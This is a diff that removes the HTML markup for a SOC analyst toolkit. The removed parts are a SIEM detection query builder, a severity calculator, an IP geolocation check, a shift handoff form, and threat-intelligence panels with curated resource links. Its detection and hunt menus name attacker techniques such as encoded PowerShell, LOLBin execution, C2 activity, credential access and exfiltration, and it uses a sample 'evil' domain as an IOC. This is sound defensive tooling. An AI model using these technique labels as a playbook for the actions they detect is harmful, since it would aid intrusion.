-            <a href="https://gchq.github.io/CyberChef/" target="_blank" class="quicklink-btn">🧪 CyberChef</a>
-            <a href="https://uncoder.io/" target="_blank" class="quicklink-btn">⚙️ Uncoder</a>
-            <a href="https://lolbas-project.github.io/" target="_blank" class="quicklink-btn">🧰 LOLBAS</a>
-            <a href="https://gtfobins.github.io/" target="_blank" class="quicklink-btn">🧰 GTFOBins</a>
-          </div>
-        </div>
-
-        <!-- ── FEATURE 3: Detection Query Builder ── -->
-        <div class="utils-card utils-card-wide">
-          <div class="utils-card-head">⚙️ Detection Query Builder
-            <div class="dqb-mode-toggle" id="dqb-mode-toggle">
-              <button class="dqb-mode-btn active" data-mode="ioc" type="button">🔍 IOC Pattern</button>
-              <button class="dqb-mode-btn" data-mode="source" type="button">🏭 Alert Source</button>
-            </div>
-          </div>
-          <p class="utils-card-desc" id="dqb-desc">Generate ready-to-paste SIEM detection queries from IOCs or select a pre-built pattern. Supports Splunk SPL, KQL, Elastic DSL, QRadar AQL, CrowdStrike NG-SIEM.</p>
-          <div class="dqb-layout">
-            <div class="dqb-left">
-
-              <!-- IOC Pattern Mode (existing) -->
-              <div id="dqb-ioc-mode">
-                <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap;">
-                  <select id="dqb-platform" class="aw-input" style="flex:1;min-width:130px;">
-                    <option value="splunk">Splunk SPL</option>
-                    <option value="kql">KQL (Sentinel)</option>
-                    <option value="elastic">Elastic DSL</option>
-                    <option value="qradar">QRadar AQL</option>
-                    <option value="cs">CrowdStrike NG-SIEM</option>
-                  </select>
-                  <select id="dqb-pattern" class="aw-input" style="flex:1;min-width:160px;">
-                    <option value="ip">IP Address Lookup</option>
-                    <option value="domain">Domain Lookup</option>
-                    <option value="hash">File Hash Lookup</option>
-                    <option value="url">URL Search</option>
-                    <option value="email">Email Address</option>
-                    <option value="cmdline">Suspicious CommandLine</option>
-                    <option value="process">Process Name</option>
-                    <option value="encoded_ps">Encoded PowerShell</option>
-                    <option value="failed_login">Failed Logins (brute force)</option>
-                    <option value="new_account">New Account Created</option>
-                    <option value="sched_task">Scheduled Task Creation</option>
-                    <option value="lateral">Lateral Movement (RDP/SMB)</option>
-                    <option value="c2_port">C2 Port Activity</option>
-                    <option value="lolbin">LOLBin Execution</option>
-                    <option value="large_upload">Large Outbound Transfer</option>
-                  </select>
-                </div>
-                <textarea id="dqb-ioc-input" spellcheck="false" rows="3" placeholder="Enter IOC value(s), one per line — or leave blank to get the pattern template...&#10;e.g. 185.220.101.45&#10;     evil-domain.xyz"></textarea>
-              </div>
-
-              <!-- Alert Source Mode (new) -->
-              <div id="dqb-source-mode" style="display:none;">
-                <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap;">
-                  <select id="dqb-alert-source" class="aw-input" style="flex:1;min-width:160px;">
-                    <option value="">— Select Alert Source —</option>
-                    <option value="crowdstrike">CrowdStrike Falcon</option>
-                    <option value="zscaler">Zscaler ZIA / ZPA</option>
-                    <option value="azure_ad">Azure AD / Entra ID</option>
-                    <option value="defender">Microsoft Defender / MDE</option>
-                    <option value="okta">Okta / SSO</option>
-                    <option value="proofpoint">Proofpoint TAP</option>
-                    <option value="aws">AWS CloudTrail</option>
-                    <option value="sentinelone">SentinelOne</option>
-                    <option value="paloalto">Palo Alto NGFW</option>
-                    <option value="darktrace">Darktrace / NDR</option>
-                    <option value="suricata">Suricata / Snort IDS</option>
-                    <option value="siem_generic">QRadar / Splunk SIEM</option>
-                  </select>
-                  <select id="dqb-alert-type" class="aw-input" style="flex:1;min-width:180px;" disabled>
-                    <option value="">— Select alert source first —</option>
-                  </select>
-                </div>
-                <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap;">
-                  <select id="dqb-siem-platform" class="aw-input" style="flex:1;min-width:160px;">
-                    <option value="cs">CrowdStrike NG-SIEM</option>
-                    <option value="splunk">Splunk SPL</option>
-                    <option value="kql">KQL (Sentinel / Defender)</option>
-                    <option value="elastic">Elastic / OpenSearch</option>
-                    <option value="qradar">IBM QRadar AQL</option>
-                  </select>
-                  <input id="dqb-src-ioc" class="aw-input" placeholder="IOC value from alert (optional, e.g. IP, user, hash)" style="flex:1;min-width:160px;"/>
-                </div>
-                <div id="dqb-source-hint" style="font-size:10px;color:var(--muted);padding:6px 8px;background:var(--bg);border-radius:6px;border:1px solid var(--border);min-height:32px;line-height:1.6;"></div>
-              </div>
-
-              <div class="utils-actions" style="margin-top:8px;">
-                <button id="dqb-generate" type="button">⚡ Generate Query</button>
-                <button id="dqb-copy" type="button">📋 Copy</button>
-                <button id="dqb-test-toggle" type="button">🧪 Test Against Log</button>
-              </div>
-              <div id="dqb-test-panel" style="display:none;margin-top:8px;">
-                <textarea id="dqb-test-input" spellcheck="false" rows="3" placeholder="Paste a sample log line to test the query..."></textarea>
-                <div class="utils-actions" style="margin-top:4px;">
-                  <button id="dqb-test-run" type="button">▶ Test</button>
-                  <span id="dqb-test-result" style="font-size:11px;padding:4px 10px;border-radius:6px;"></span>
-                </div>
-              </div>
-            </div>
-            <div class="dqb-right">
-              <pre id="dqb-output" class="dqb-output">← Configure above and click Generate Query</pre>
-            </div>
-          </div>
-        </div>
-
-
-        <!-- ── FEATURE 5: Incident Severity Calculator ── -->
-        <div class="utils-card">
-          <div class="utils-card-head">🚨 Incident Severity Calculator</div>
-          <p class="utils-card-desc">Score incidents consistently using a 4-factor matrix. Outputs P1–P4 with SLA and justification text.</p>
-          <div class="sev-calc-grid">
-            <div class="sev-factor">
-              <div class="sev-factor-label">Asset Criticality</div>
-              <div class="sev-factor-desc" id="sev-asset-desc">Select...</div>
-              <input type="range" id="sev-asset" min="1" max="4" value="2" class="sev-slider" oninput="updateSevCalc()">
-              <div class="sev-factor-ticks"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
-            </div>
-            <div class="sev-factor">
-              <div class="sev-factor-label">Threat Confidence</div>
-              <div class="sev-factor-desc" id="sev-threat-desc">Select...</div>
-              <input type="range" id="sev-threat" min="1" max="4" value="2" class="sev-slider" oninput="updateSevCalc()">
-              <div class="sev-factor-ticks"><span>Possible</span><span>Likely</span><span>Confirmed</span><span>Active TP</span></div>
-            </div>
-            <div class="sev-factor">
-              <div class="sev-factor-label">Blast Radius</div>
-              <div class="sev-factor-desc" id="sev-blast-desc">Select...</div>
-              <input type="range" id="sev-blast" min="1" max="4" value="2" class="sev-slider" oninput="updateSevCalc()">
-              <div class="sev-factor-ticks"><span>1 Host</span><span>Dept</span><span>Org-wide</span><span>External</span></div>
-            </div>
-            <div class="sev-factor">
-              <div class="sev-factor-label">Data Sensitivity</div>
-              <div class="sev-factor-desc" id="sev-data-desc">Select...</div>
-              <input type="range" id="sev-data" min="1" max="4" value="2" class="sev-slider" oninput="updateSevCalc()">
-              <div class="sev-factor-ticks"><span>Public</span><span>Internal</span><span>Confidential</span><span>PII/PCI</span></div>
-            </div>
-          </div>
-          <div id="sev-result" class="sev-result"></div>
-          <div class="utils-actions" style="margin-top:8px;">
-            <button id="sev-copy-btn" type="button">📋 Copy Justification</button>
-            <button id="sev-to-case-btn" type="button">📁 Add to Case</button>
-          </div>
-        </div>
-
-        <!-- ── FEATURE 6: IP Geolocation & Travel Check ── -->
-        <div class="utils-card utils-card-wide">
-          <div class="utils-card-head">🗺️ IP Geolocation &amp; Travel Check</div>
-          <p class="utils-card-desc">Geolocate up to 10 IPs. Check impossible travel between two login events. Powered by ip-api.com (free, no key needed).</p>
-          <div class="geo-layout">
-            <div class="geo-left">
-              <textarea id="geo-ips-input" spellcheck="false" rows="5" placeholder="One IP per line (up to 10):&#10;12.55.204.102&#10;2607:fb90:3924:9053:e53a:837:9a4a:c467&#10;136.226.50.165"></textarea>
-              <div class="utils-actions">
-                <button id="geo-lookup-btn" type="button">🌍 Geolocate IPs</button>
-                <button id="geo-clear-btn" type="button">🗑 Clear</button>
-              </div>
-              <div class="geo-travel-section">
-                <div style="font-size:11px;font-weight:700;color:var(--text);margin-bottom:6px;">⚡ Impossible Travel Check</div>
-                <div style="display:flex;gap:6px;flex-wrap:wrap;">
-                  <input id="geo-ip1" class="aw-input" placeholder="IP 1 (e.g. 12.55.204.102)" style="flex:1;min-width:140px;"/>
-                  <input id="geo-t1" class="aw-input" type="datetime-local" style="flex:1;min-width:160px;" title="Login 1 timestamp"/>
-                </div>
-                <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px;">
-                  <input id="geo-ip2" class="aw-input" placeholder="IP 2 (e.g. 185.220.101.45)" style="flex:1;min-width:140px;"/>
-                  <input id="geo-t2" class="aw-input" type="datetime-local" style="flex:1;min-width:160px;" title="Login 2 timestamp"/>
-                </div>
-                <button id="geo-travel-btn" type="button" style="margin-top:6px;">⚡ Check Travel</button>
-                <div id="geo-travel-result" class="geo-travel-result" style="display:none"></div>
-              </div>
-            </div>
-            <div class="geo-right">
-              <div id="geo-results-table" class="geo-table-wrap"></div>
-              <div id="geo-map" class="geo-map-placeholder">🌍 Map will appear here after lookup</div>
-            </div>
-          </div>
-        </div>
-
-        <!-- ── FEATURE 8: Shift Handoff Generator ── -->
-        <div class="utils-card utils-card-wide">
-          <div class="utils-card-head">📋 Shift Handoff Generator</div>
-          <p class="utils-card-desc">Generate a formatted shift handoff report. Auto-reads open cases and IOC history from this session.</p>
-          <div class="handoff-layout">
-            <div class="handoff-form">
-              <div style="display:flex;gap:8px;flex-wrap:wrap;">
-                <input id="ho-analyst" class="aw-input" placeholder="Your name / analyst ID" style="flex:1;min-width:140px;"/>
-                <input id="ho-team" class="aw-input" placeholder="Team / Tier (e.g. SOC Tier 1)" style="flex:1;min-width:140px;"/>
-              </div>
-              <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap;">
-                <input id="ho-shift-start" class="aw-input" type="datetime-local" style="flex:1;" title="Shift start"/>
-                <input id="ho-shift-end" class="aw-input" type="datetime-local" style="flex:1;" title="Shift end"/>
-              </div>
-              <textarea id="ho-findings" spellcheck="false" rows="3" placeholder="Key findings this shift (one per line)..." style="margin-top:8px;width:100%;"></textarea>
-              <textarea id="ho-pending" spellcheck="false" rows="2" placeholder="Open items / pending investigations..." style="margin-top:6px;width:100%;"></textarea>
-              <textarea id="ho-recommendations" spellcheck="false" rows="2" placeholder="Recommendations for next shift..." style="margin-top:6px;width:100%;"></textarea>
-              <div class="utils-actions" style="margin-top:8px;">
-                <button id="ho-generate-btn" type="button">📋 Generate Handoff</button>
-                <select id="ho-format" class="aw-input" style="font-size:11px;padding:5px 8px;">
-                  <option value="text">Plain Text</option>
-                  <option value="markdown">Markdown</option>
-                  <option value="exec">Exec Summary</option>
-                </select>
-              </div>
-            </div>
-            <div class="handoff-output-wrap">
-              <pre id="ho-output" class="handoff-output">← Fill in the form and click Generate</pre>
-              <div class="utils-actions" style="margin-top:6px;">
-                <button id="ho-copy-btn" type="button">📋 Copy</button>
-                <button id="ho-download-btn" type="button">💾 Download .txt</button>
-              </div>
-            </div>
-          </div>
-        </div>
-
-      </div>
-    </div><!-- end tab-utils -->
-
-    <!-- ===== CTI FEED TAB ===== -->
-    <div id="tab-cti" class="tab-panel">
-      <div class="input-panel">
-        <div class="bulk-header">
-          <h3>🌐 CTI — Cyber Threat Intelligence</h3>
-          <p class="sub">Live threat feeds, actor profiles, campaign tracking, and intelligence sharing. Pull current intel from open sources without leaving the toolkit.</p>
-        </div>
-
-      </div>
-      <!-- CTI sub-tabs -->
-      <div class="cti-subtab-bar">
-        <button class="cti-sub-btn active" data-ctitab="feeds" type="button">📡 Live Feeds</button>
-        <button class="cti-sub-btn" data-ctitab="news" type="button">🗞️ Threat News</button>
-        <button class="cti-sub-btn" data-ctitab="actors" type="button">🕵 Actor Intel</button>
-        <button class="cti-sub-btn" data-ctitab="ioc-check" type="button">🎯 IOC Intel Check</button>
-        <button class="cti-sub-btn" data-ctitab="campaigns" type="button">📊 Campaign Tracker</button>
-        <button class="cti-sub-btn" data-ctitab="hunt" type="button">🏹 Hunt Queries</button>
-        <button class="cti-sub-btn" data-ctitab="resources" type="button">📚 Intel Resources</button>
-      </div>
-
-      <!-- FEEDS PANEL -->
-      <div id="cti-panel-feeds" class="cti-panel active">
-        <div class="cti-feed-controls">
-          <button id="cti-feeds-refresh" type="button">🔄 Refresh All Feeds</button>
-          <span id="cti-feed-status" class="cti-feed-status">Click Refresh to load latest threat intelligence</span>
-        </div>
-        <div class="cti-feeds-grid" id="cti-feeds-grid">
-          <!-- Feed cards injected by JS -->
-        </div>
-      </div>
-
-      <!-- THREAT NEWS PANEL -->
-      <div id="cti-panel-news" class="cti-panel">
-        <div class="cti-news-header">
-          <div class="cti-news-header-left">
-            <span class="cti-news-title">🗞️ Threat Intelligence News</span>
-            <span class="cti-news-subtitle">AI-summarized cybersecurity headlines from open sources</span>
-          </div>
-          <div class="cti-news-controls">
-            <select id="cti-news-topic" class="cti-news-select">
-              <option value="latest">🌐 Latest Threats</option>
-              <option value="ransomware">🔒 Ransomware</option>
-              <option value="apt">🕵️ APT / Nation-State</option>
-              <option value="vulnerability">🔓 Vulnerabilities & CVEs</option>
-              <option value="phishing">🎣 Phishing & BEC</option>
-              <option value="malware">🦠 Malware Families</option>
-              <option value="cloud">☁️ Cloud Security</option>
-              <option value="cisa">🧨 CISA Advisories</option>
-            </select>
-            <button id="cti-news-refresh" class="cti-news-btn" type="button">⚡ Get Latest</button>
-          </div>
-        </div>
-        <div id="cti-news-status" class="cti-news-status" style="display:none"></div>
-        <div id="cti-news-results" class="cti-news-results">
-          <div class="cti-news-empty">
-            <div class="cti-news-empty-icon">🗞️</div>
-            <div class="cti-news-empty-text">Click <strong>Get Latest</strong> to pull real-time threat intelligence news</div>
-            <div class="cti-news-empty-sub">Summaries are AI-generated from current cybersecurity sources</div>
-          </div>
-        </div>
-        <div class="cti-news-footer">
-          <span class="cti-news-footer-note">⚠️ AI-generated summaries. Always verify with primary sources before acting. Last updated: <span id="cti-news-timestamp">—</span></span>
-          <div class="cti-news-sources">
-            <a href="https://www.cisa.gov/news-events/cybersecurity-advisories" target="_blank" class="cti-news-src-link">CISA</a>
-            <a href="https://www.bleepingcomputer.com" target="_blank" class="cti-news-src-link">BleepingComputer</a>
-            <a href="https://krebsonsecurity.com" target="_blank" class="cti-news-src-link">KrebsOnSecurity</a>
-            <a href="https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/" target="_blank" class="cti-news-src-link">MSTIC</a>
-            <a href="https://unit42.paloaltonetworks.com" target="_blank" class="cti-news-src-link">Unit 42</a>
-            <a href="https://therecord.media" target="_blank" class="cti-news-src-link">The Record</a>
-          </div>
-        </div>
-      </div>
-
-      <!-- ACTOR INTEL PANEL -->
-      <div id="cti-panel-actors" class="cti-panel">
-        <div class="cti-search-row">
-          <input id="cti-actor-input" class="aw-input" type="text" placeholder="Actor name, alias, or group (e.g. APT29, Lazarus, FIN7, Scattered Spider)" />
-          <button id="cti-actor-search-btn" type="button">🔍 Search</button>
-          <button id="cti-actor-random" type="button" title="Show a random known threat actor">🎲 Random Actor</button>
-        </div>
-        <div id="cti-actor-results" class="cti-actor-results"></div>
-      </div>
-
-      <!-- IOC INTEL CHECK PANEL -->
-      <div id="cti-panel-ioc-check" class="cti-panel">
-        <div class="cti-ioc-check-layout">
-          <div class="cti-ioc-check-left">
-            <p class="utils-card-desc">Check any IOC against open-source CTI databases. Enter one IOC then click Check — results show known threat context, associated campaigns, and related indicators.</p>
-            <div class="cti-search-row">
-              <input id="cti-ioc-input" class="aw-input" type="text" placeholder="IP, domain, hash, URL, email, CVE..." style="flex:1" />
-              <button id="cti-ioc-check-btn" type="button">🎯 Check Intel</button>
-            </div>
-            <div id="cti-ioc-status" class="status" style="margin-top:8px;">
-              <span>Enter an IOC above to check threat context</span><span class="badge">CTI</span>
-            </div>
-          </div>
-        </div>
-        <div id="cti-ioc-results" class="cti-ioc-results"></div>
-      </div>
-
-      <!-- CAMPAIGNS PANEL -->
-      <div id="cti-panel-campaigns" class="cti-panel">
-        <div class="cti-campaigns-header">
-          <h4>📊 Active Campaign Tracker</h4>
-          <p class="utils-card-desc">Track ongoing campaigns and associate IOCs from your investigations. Add entries manually or import from triage results.</p>
-          <div class="cti-search-row">
-            <input id="cti-camp-name" class="aw-input" type="text" placeholder="Campaign name (e.g. Operation ShadowBroker, INC-2025-042)" />
-            <input id="cti-camp-actor" class="aw-input" type="text" placeholder="Attributed actor (optional)" style="max-width:200px" />
-            <select id="cti-camp-status" class="aw-input" style="max-width:140px">
-              <option value="active">🔴 Active</option>
-              <option value="monitoring">🟡 Monitoring</option>
-              <option value="closed">🟢 Closed</option>
-            </select>
-            <button id="cti-camp-add" type="button">➕ Add Campaign</button>
-          </div>
-        </div>
-        <div id="cti-campaigns-list" class="cti-campaigns-list"></div>
-        <div class="cti-camp-actions">
-          <button id="cti-camp-export" type="button">📤 Export Campaigns</button>
-          <button id="cti-camp-clear" type="button">🗑 Clear All</button>
-        </div>
-      </div>
-
-      <!-- RESOURCES PANEL -->
-      <!-- HUNT QUERIES PANEL (Feature 4) -->
-      <div id="cti-panel-hunt" class="cti-panel">
-        <div class="hunt-header">
-          <div class="hunt-filters">
-            <select id="hunt-platform" class="cti-news-select">
-              <option value="splunk">Splunk SPL</option>
-              <option value="kql">KQL (Sentinel)</option>
-              <option value="cs">CrowdStrike NG-SIEM</option>
-              <option value="elastic">Elastic DSL</option>
-              <option value="qradar">QRadar AQL</option>
-            </select>
-            <select id="hunt-category" class="cti-news-select">
-              <option value="all">All Techniques</option>
-              <optgroup label="── By Source ──">
-              <option value="identity">🪪 Identity & Cloud (All)</option>
-              <option value="credential">🔑 Credential Access (All)</option>
-              <option value="c2">📡 C2 / Command & Control</option>
-              <option value="exfil">📤 Exfiltration</option>
-              </optgroup>
-              <optgroup label="── By Platform ──">
-              <option value="initial_access">Initial Access</option>
-              <option value="execution">Execution</option>
-              <option value="persistence">Persistence</option>
-              <option value="privilege_esc">Privilege Escalation</option>
-              <option value="defense_evasion">Defense Evasion</option>
-              <option value="lateral">Lateral Movement</option>
-              </optgroup>
-            </select>
-            <button id="hunt-filter-btn" class="cti-news-btn" type="button">🔍 Filter</button>
-          </div>
-        </div>
-        <div id="hunt-grid" class="hunt-grid"></div>
-      </div>
-
-      <div id="cti-panel-resources" class="cti-panel">
-        <div class="cti-resources-grid">
-
-          <div class="cti-res-section">
-            <div class="cti-res-head">📡 Open Threat Intelligence Platforms</div>
-            <div class="quicklinks-grid">
-              <a href="https://otx.alienvault.com/" target="_blank" class="quicklink-btn">👽 OTX AlienVault</a>
-              <a href="https://threatfox.abuse.ch/" target="_blank" class="quicklink-btn">🦊 ThreatFox</a>
-              <a href="https://bazaar.abuse.ch/" target="_blank" class="quicklink-btn">🦠 MalwareBazaar</a>
-              <a href="https://urlhaus.abuse.ch/" target="_blank" class="quicklink-btn">🏚 URLhaus</a>
-              <a href="https://feodotracker.abuse.ch/" target="_blank" class="quicklink-btn">🎣 FeodoTracker</a>
-              <a href="https://sslbl.abuse.ch/" target="_blank" class="quicklink-btn">🔐 SSL Blacklist</a>
-              <a href="https://pulsedive.com/" target="_blank" class="quicklink-btn">📡 Pulsedive</a>
-              <a href="https://intelx.io/" target="_blank" class="quicklink-btn">📡 IntelX</a>
-              <a href="https://www.virustotal.com/gui/home/search" target="_blank" class="quicklink-btn">🧪 VirusTotal</a>
-              <a href="https://viz.greynoise.io/" target="_blank" class="quicklink-btn">🌫 GreyNoise</a>
-              <a href="https://www.shodan.io/" target="_blank" class="quicklink-btn">🛰 Shodan</a>
-              <a href="https://search.censys.io/" target="_blank" class="quicklink-btn">🔭 Censys</a>
-            </div>
-          </div>
-
-          <div class="cti-res-section">
-            <div class="cti-res-head">🧩 MITRE & Framework Resources</div>
-            <div class="quicklinks-grid">
-              <a href="https://attack.mitre.org/" target="_blank" class="quicklink-btn">🧩 ATT&CK Enterprise</a>
-              <a href="https://attack.mitre.org/software/" target="_blank" class="quicklink-btn">🛠 ATT&CK Software</a>
-              <a href="https://attack.mitre.org/groups/" target="_blank" class="quicklink-btn">🕵 ATT&CK Groups</a>
-              <a href="https://attack.mitre.org/campaigns/" target="_blank" class="quicklink-btn">📊 ATT&CK Campaigns</a>
-              <a href="https://d3fend.mitre.org/" target="_blank" class="quicklink-btn">🛡 D3FEND</a>
-              <a href="https://car.mitre.org/" target="_blank" class="quicklink-btn">🚗 CAR Analytic Repo</a>
-              <a href="https://mitre-engenuity.org/cybersecurity/center-for-threat-informed-defense/" target="_blank" class="quicklink-btn">🏛 CTID</a>
-              <a href="https://navigator.attack.mitre.org/" target="_blank" class="quicklink-btn">🗺 ATT&CK Navigator</a>
-            </div>
-          </div>
-
-          <div class="cti-res-section">
-            <div class="cti-res-head">📰 Threat Reports & Blogs</div>
-            <div class="quicklinks-grid">
-              <a href="https://www.mandiant.com/resources/blog" target="_blank" class="quicklink-btn">🔥 Mandiant Blog</a>
-              <a href="https://research.checkpoint.com/" target="_blank" class="quicklink-btn">🔬 Check Point Research</a>
-              <a href="https://unit42.paloaltonetworks.com/" target="_blank" class="quicklink-btn">🎯 Unit42</a>
-              <a href="https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/095/591/original/062823_Annual_Report.pdf" target="_blank" class="quicklink-btn">🕵️ Talos Blog</a>
-              <a href="https://blog.malwarebytes.com/threat-intelligence/" target="_blank" class="quicklink-btn">🦠 Malwarebytes TI</a>
-              <a href="https://www.secureworks.com/research" target="_blank" class="quicklink-btn">🔐 Secureworks</a>
-              <a href="https://thedfirreport.com/" target="_blank" class="quicklink-btn">🔍 DFIR Report</a>
-              <a href="https://www.cisa.gov/news-events/cybersecurity-advisories" target="_blank" class="quicklink-btn">🧨 CISA Advisories</a>
-              <a href="https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/" target="_blank" class="quicklink-btn">🪟 MSTIC Blog</a>
-              <a href="https://symantec-enterprise-blogs.security.com/threat-intelligence" target="_blank" class="quicklink-btn">🔵 Symantec TI</a>
-            </div>
-          </div>
-
-          <div class="cti-res-section">
-            <div class="cti-res-head">📦 IOC Feed Subscriptions (Free)</div>
-            <div class="quicklinks-grid">
-              <a href="https://feodotracker.abuse.ch/downloads/ipblocklist.csv" target="_blank" class="quicklink-btn">📥 Feodo IP List</a>
-              <a href="https://urlhaus.abuse.ch/downloads/csv/" target="_blank" class="quicklink-btn">📥 URLhaus CSV</a>
-              <a href="https://bazaar.abuse.ch/export/" target="_blank" class="quicklink-btn">📥 MalwareBazaar Export</a>
-              <a href="https://threatfox-api.abuse.ch/api/v1/" target="_blank" class="quicklink-btn">📥 ThreatFox API</a>
-              <a href="https://rules.emergingthreats.net/open/suricata/rules/" target="_blank" class="quicklink-btn">📥 Emerging Threats Rules</a>
-              <a href="https://github.com/stamparm/ipsum" target="_blank" class="quicklink-btn">📥 ipsum IP Blocklist</a>
-              <a href="https://www.dan.me.uk/torlist/" target="_blank" class="quicklink-btn">📥 TOR Exit Nodes</a>
-              <a href="https://cinsscore.com/list/ci-badguys.txt" target="_blank" class="quicklink-btn">📥 CI BadGuys List</a>
-            </div>
-          </div>
-
-          <div class="cti-res-section">
-            <div class="cti-res-head">🔬 Sandbox & Dynamic Analysis</div>
-            <div class="quicklinks-grid">
-              <a href="https://any.run/" target="_blank" class="quicklink-btn">🏃 AnyRun</a>
-              <a href="https://www.hybrid-analysis.com/" target="_blank" class="quicklink-btn">🧫 Hybrid Analysis</a>
-              <a href="https://www.joesandbox.com/" target="_blank" class="quicklink-btn">🧪 JOE Sandbox</a>
-              <a href="https://tria.ge/" target="_blank" class="quicklink-btn">🧯 Triage</a>
-              <a href="https://analyze.intezer.com/" target="_blank" class="quicklink-btn">🧬 Intezer Analyze</a>
-              <a href="https://cuckoo.cert.ee/" target="_blank" class="quicklink-btn">🐦 Cuckoo (CERT-EE)</a>
-              <a href="https://www.virustotal.com/gui/home/upload" target="_blank" class="quicklink-btn">📤 VT File Upload</a>
-            </div>
-          </div>
-
-          <div class="cti-res-section">
-            <div class="cti-res-head">📜 Detection Engineering</div>
-            <div class="quicklinks-grid">
-              <a href="https://github.com/SigmaHQ/sigma" target="_blank" class="quicklink-btn">⚡ Sigma Rules</a>
-              <a href="https://uncoder.io/" target="_blank" class="quicklink-btn">⚙️ Uncoder.io</a>
-              <a href="https://github.com/elastic/detection-rules" target="_blank" class="quicklink-btn">🔵 Elastic Rules</a>
-              <a href="https://github.com/splunk/security_content" target="_blank" class="quicklink-btn">🔍 Splunk Content</a>
-              <a href="https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries" target="_blank" class="quicklink-btn">🪟 M365D Hunting</a>
-              <a href="https://car.mitre.org/analytics/" target="_blank" class="quicklink-btn">🚗 MITRE CAR</a>
-              <a href="https://tdm.socprime.com/" target="_blank" class="quicklink-btn">🎯 SOC Prime TDM</a>
-            </div>
-          </div>
-
-        </div>
-      </div>
-    </div><!-- end tab-cti -->
-
-  </div><!-- end main -->
+    </section>
+  </main>
 
   <script src="script.js"></script>
 </body>
